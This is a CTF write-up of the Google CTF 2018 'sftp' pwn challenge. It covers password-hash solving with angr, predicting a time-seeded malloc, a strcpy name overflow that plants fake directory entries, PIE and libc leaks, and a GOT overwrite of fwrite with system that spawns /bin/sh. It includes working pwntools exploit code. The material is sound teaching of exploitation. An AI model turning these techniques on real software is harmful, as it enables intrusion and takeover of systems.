---
title: "SFTP - Google CTF 2018"
author: "abiondo, andreafioraldi"
comments: true
tags: google ctf pwn mhackeroni
---

> This file server has a sophisticated malloc implementation designed to thwart traditional heap exploitation techniques...

The challenge file is only a x86_64 ELF binary named sftp.

The active protections are the following:
+ Partial RELRO
+ Stack canary
+ NX
+ PIE
+ FORTIFY

Executing the file results in a password prompt:

![sftp_1]({{"/assets/img/sftp_writeup/sftp_1.png" | absolute_url}})

Let’s dissect it in IDA.

In the main procedure we can see that the authentication is handled by a function that returns a boolean value.

Here the decompiled code:

![sftp_2]({{"/assets/img/sftp_writeup/sftp_2.png" | absolute_url}})

The password is hashed using a custom algorithm as we can see and the hash must be 0x8dfa to gain the access.

To reverse the hash I use the IDA Pro plugin IDAngr with the following steps:
+ Set a breakpoint just after the password scanf (as in the picture)
+ Run the debugger and insert “a”*15 as the password when the debugged process ask for it.
+ When the breakpoint is hitted set the avoid address to the “return 0” address and the find address to the “return result” address.
+ Mark the password as symbolic

![sftp_3]({{"/assets/img/sftp_writeup/sftp_3.png" | absolute_url}})

To get an usable result some constraints must be added to the symbolic password:
it must be printable and without spaces (due to scanf).

![sftp_4]({{"/assets/img/sftp_writeup/sftp_4.png" | absolute_url}})

Ok it’s time to run the exploration engine and get a result.

![sftp_5]({{"/assets/img/sftp_writeup/sftp_5.png" | absolute_url}})

… after some time …

![sftp_6]({{"/assets/img/sftp_writeup/sftp_6.png" | absolute_url}})

Here you go! **p&a2]** is a valid password for SFTP.

After the successful login we are in a shell-like prompt with some commands available:

![sftp_7]({{"/assets/img/sftp_writeup/sftp_7.png" | absolute_url}})

With ls we can see that in the current directory there are two nodes: flag and src.

The command “get flag” returned a very interesting output, check it [here](https://i.ytimg.com/vi/PtUmOMlWYcw/maxresdefault.jpg).

In the src folder you can find the application source code sftp.c (You can find it in the attached zip file).

The next step is to analyze the code in order to find a vulnerability.

You can immediately see that the files secure_allocator.h and filesystem.h included in the code are missing and so we must combine the sftp.c file with the information that we can extract from the binary with a bit of reverse engineering.

Firstly we try to reconstruct secure_allocator.h in which is probably defined a custom implementation of malloc, realloc and free.

In the binary we have 3 wonderful symbols, malloc realloc and free.

They actually look pretty dumb:

```c
void* malloc(size_t size) {
    return (rand() & 0x1FFFFFFF | 0x40000000LL);
}

void free(void* ptr) {}

void* realloc(void* ptr, size_t size) {
    return ptr;
}
```

In order to work malloc needs the address 0x40000000 to be mapped and in the main procedure this is not done, so let’s search for an initialization routine.

The binary has the .init_array section, a list of functions pointers that are executed before main.

These pointers are two in sftp.

The first is the allocator initializer, it maps 0x40000000 and calls srand with time(0).

This is good because the rand return value (and so malloc) is predictable.

The second is related to the filesystem initialization, we will analyze it later.

With a first analysis of the source code you can notice that the structure entry has a name field of size name_max (20) but the new_entry procedure takes a path as parameter of size path_max (4096) and then it is copied with strcpy in child->name.

So we have an overflow here.

```c
entry** new_entry(char* path) {
 ...
  name = strrchr(path, '/');
  if (!name) {
    name = path;
    path = NULL;
  } else {
    *name++ = 0;
  }
 ...
  *child = malloc(sizeof(entry));
  (*child)->parent_directory = parent;
  (*child)->type = INVALID_ENTRY;
  strcpy((*child)->name, name); //OVERFLOW
```

The secure allocator realloc implementation combined with the new_entry code is very interesting.

In particular this line of code:

```c
directory_entry* new_parent = realloc(parent, sizeof(directory_entry) + (parent->child_count * 2 * sizeof(entry*)));
```

By default a directory entry has an array of 16 elements used to store pointers to children entries.

The realloc does nothing so if we can write a fake address in the `entry->child[17]` when child_count is less than 16 it will be considered a child of the directory also after the reallocation.

How could we possibly write somthing in this array? Of course using the buffer overflow in the name field!

We can craft a fake child abusing the code of new_directory + new_entry:

```c
directory_entry* new_directory(char* path) {
  directory_entry* dir = NULL;
  entry** child = new_entry(path); //do here the overflow using path

  dir = realloc(*child, sizeof(directory_entry) + 16 * sizeof(entry*));
  dir->entry.type = DIRECTORY_ENTRY;
  dir->child_count = 16;
  memset(dir->child, 0, 16 * sizeof(entry*)); //beware!

  return dir;
}
```

With the overflow in name we must write data until the 17th child entry of the directory (the first 16 are later set to 0 with the memset).

Now we have a problem? Which address we must write in the array?

We should use a fake entry created with put_file, but how we can know the address of a entry?

Simply, we can predict malloc using rand(time(0)) in the exploit.

So let’s return to the filesystem initialization routine.
(Import the structures in IDA for a better re)

```c
struct directory_entry *init_filesystem()
{
  struct file_entry *flag_entry; // rbx
  size_t v1; // rax
  int v2; // eax
  size_t v3; // rdx
  char *v4; // rdi
  size_t v5; // rax
  char *v6; // rdx
  struct file_entry *v7; // rbx
  size_t v8; // rax
  int v9; // eax
  size_t v10; // rdx
  char *v11; // rdi
  struct directory_entry *result; // rax
  _BYTE *v13; // rdx

  home_entry.entry.parent_directory = 0LL;
  strcpy(home_entry.entry.name, "home");
  root = &home_entry;
  home_entry.child_count = 1LL;
  user_entry_ptr = 0LL;
  pwd = &home_entry;
  pwd = new_dir(username); //<<<<<<
  flag_entry = *new_entry("flag");
  v1 = fake_flag_size;
  flag_entry->entry.type = FILE_ENTRY;
  flag_entry->size = v1;
  v2 = rand();
  v3 = fake_flag_size;
  v4 = (v2 & 0x1FFFFFFF | 0x40000000LL);
  flag_entry->data = v4;
  memcpy(v4, &fake_flag_content, v3);
  if ( flag_entry->size )
  {
    v5 = 0LL;
    do
    {
      v6 = &flag_entry->data[v5++];
      *v6 ^= 0x89u;
    }
    while ( flag_entry->size > v5 );
  }
  new_dir_no_parent("src");
  v7 = *new_entry("src/sftp.c");
  v8 = sftp_c_size;
  v7->entry.type = FILE_ENTRY;
  v7->size = v8;
  v9 = rand();
  v10 = sftp_c_size;
  v11 = (v9 & 0x1FFFFFFF | 0x40000000LL);
  v7->data = v11;
  result = memcpy(v11, &xored_sftp_c, v10);
  if ( v7->size )
  {
    result = 0LL;
    do
    {
      v13 = result + v7->data;
      result = (result + 1);
      *v13 ^= 0x37u;
    }
    while ( v7->size > result );
  }
  return result;
}
```

As you can see the user directory is created with new_dir as a regular directory (with the parent directory = home_entry).

The user_entry address is also the first address returned by malloc.
We can predict it in the following manner:

```python
libc = CDLL('libc.so.6')
libc.srand(int(time.time()))

malloc = lambda : 0x40000000 | (libc.rand() & 0x01fffffff)
user_entry_addr = malloc()
log.info('Predicted user entry @ 0x{:08x}'.format(user_entry_addr))
```

We must do this also for the other addresses returned by malloc that we want to predict simply invoking the malloc lambda in the script the same times as malloc is called in the binary.

The home_entry structure is in `.data`, so we can use the address of the user directory as the fake entry to leak the home_entry address and bypass PIE.

So let’s write a piece of code to leak PIE (using pwntools):

```python
prog = log.progress('Putting fake leak entry')
leak_entry  = p64(0) # parent_directory, don't care
leak_entry += p32(2) # type = FILE_ENTRY
leak_entry += 'leak'.ljust(20, '\x00') # name
leak_entry += p64(8) # size = 8
leak_entry += p64(user_entry_addr) # data = user_entry_addr->parent_directory
# printing the content of leak will print the home_entry address (in .bss)
put_file('leak_entry', leak_entry)
prog.success()

prog = log.progress('Overflowing directory (leak)')
dirname  = 'A' * (20 + 8 + 17*8) # name + size + 17 entry*
dirname += p32(leak_entry_addr) # 18th fake entry
send_cmd('mkdir ' + dirname)
prog.success()

prog = log.progress('Triggering directory reallocation (leak)')
trunc_dirname = 'A'*20 + '\x10' # ls command list the directory with a truced name
send_cmd('cd ' + trunc_dirname)
# the first 17 entries are zeored with memset, we must insert dummy entries to reach the 18th entry
for i in range(17):
    put_file(str(i), 'A')
prog.success()

prog = log.progress('Leaking binary base')
leak = get_file('leak')
base = u64(leak) - 0x208be0
prog.success('@ 0x{:012x}'.format(base))
```

With a leak of the base address we can repeat the previous procedure to print values from the GOT and try to find the libc.

```python
prog = log.progress('Putting fake GOT entry')
got_entry  = p64(0) # parent_directory, don't care
got_entry += p32(2) # type = FILE_ENTRY
got_entry += 'got'.ljust(20, '\x00') # name
got_entry += p64(2*8) # size
got_entry += p64(base + 0x205018 + 192) # data = start of GOT + 192 (frwite entry)
put_file('got_entry', got_entry)
prog.success()

prog = log.progress('Overflowing directory (GOT)')
dirname  = 'B' * (20 + 8 + 17*8) # name + size + 17 entry*
dirname += p32(got_entry_addr) # 18th fake entry
send_cmd('mkdir ' + dirname)
prog.success()

prog = log.progress('Triggering directory reallocation (GOT)')
trunc_dirname = 'B'*20 + '\x10'
send_cmd('cd ' + trunc_dirname)
for i in range(17):
    put_file(str(i), 'A')
prog.success()

got = get_file('got')
for i in range(0, len(got), 8):
    print(hex(u64(got[i:i+8])))
```

With this snippet we can print the address of fwrite and rand, the last 2 GOT entries.

With a quick lookup in our libc database I found that we have a match with Ubuntu GLIBC 2.23-0ubuntu9 (you can found it in the attached zip file)

What's next? With the fake entry for the got that we have created before we can use put_file to overwrite the fwrite entry with system.

fwrite is used in writen and writen is called in handle_get.

```c
bool handle_get(char* path) {
  file_entry* file = find_file(path);
  if (file) {
    printf("%zu\n", file->size);
    writen(file->data, file->size); //calls fwrite(file->data, ...)
  } else {
    printf("File \"%s\" not found.\n", path);
  }

  return true;
}
```

So if fwrite() is now in fact system() and the argument passed to the call in writen is file->data we must create a file that contains the command that we want execute.

```python
libc_bin.address = u64(got[:8]) - libc_bin.symbols["fwrite"]
log.info("libc base address: 0x%x" % libc_bin.address)

put_file("cmd", "/bin/sh\x00")

target = p64(libc_bin.symbols["system"])
put_file("got", target)

p.sendline("get cmd") #system("/bin/sh")
```

And win!

![sftp_8]({{"/assets/img/sftp_writeup/sftp_8.png" | absolute_url}})

In the following link to a zip file you can find the sftp.c source code, the sftp binary, the full exploit, the libc binary and the header that must be imported in IDA.

Attachment: [https://drive.google.com/file/d/1O0-QFmp7KQ1ojANU5y75ouv6hFhm4QD0/view?usp=sharing](https://drive.google.com/file/d/1O0-QFmp7KQ1ojANU5y75ouv6hFhm4QD0/view?usp=sharing)

